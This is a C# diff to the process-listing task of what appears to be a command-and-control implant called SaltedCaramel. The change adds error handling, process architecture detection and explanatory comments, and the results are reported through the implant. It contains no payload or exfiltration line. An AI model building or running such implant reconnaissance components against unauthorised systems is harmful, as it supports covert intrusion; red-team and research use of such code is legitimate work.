@@ -15,13 +15,27 @@ namespace SaltedCaramel.Tasks
             foreach (Process proc in Process.GetProcesses())
             {
                 Dictionary<string, string> procEntry = new Dictionary<string, string>();
+
                 procEntry.Add("process_id", proc.Id.ToString());
+                procEntry.Add("name", proc.ProcessName);
+
                 // This will fail if we don't have permissions to access the process.
                 try { procEntry.Add("parent_process_id", GetParentProcess(proc.Handle).ToString()); }
                 // Ignore it and move on
                 catch { procEntry.Add("parent_process_id", ""); }
-                procEntry.Add("name", proc.ProcessName);
-                procEntry.Add("user", GetProcessUser(proc.Handle));
+
+                try { procEntry.Add("user", GetProcessUser(proc.Handle)); }
+                catch { procEntry.Add("user", ""); }
+
+                try
+                {
+                    bool is64;
+                    Win32.IsWow64Process(proc.Handle, out is64);
+                    if (is64) procEntry.Add("arch", "x86");
+                    else procEntry.Add("arch", "x64");
+                }
+                catch { procEntry.Add("arch", ""); }
+
                 procList.Add(procEntry);
             }
 
@@ -30,14 +44,16 @@ namespace SaltedCaramel.Tasks
             implant.SendComplete(task.id);
         }
 
+        // No way of getting parent process from C#, but we can use NtQueryInformationProcess to get this info.
         internal static int GetParentProcess(IntPtr procHandle)
         {
             Win32.PROCESS_BASIC_INFORMATION procinfo = new Win32.PROCESS_BASIC_INFORMATION();
-            int rl;
-            int info = Win32.NtQueryInformationProcess(procHandle, 0, ref procinfo, Marshal.SizeOf(procinfo), out rl);
+            int info = Win32.NtQueryInformationProcess(procHandle, 0, ref procinfo, Marshal.SizeOf(procinfo), out int rl);
             return procinfo.InheritedFromUniqueProcessId.ToInt32();
         }
 
+        // With a handle to a process token, we can create a new WindowsIdentity
+        // and use that to get the process owner's username
         internal static string GetProcessUser(IntPtr procHandle)
         {
             try
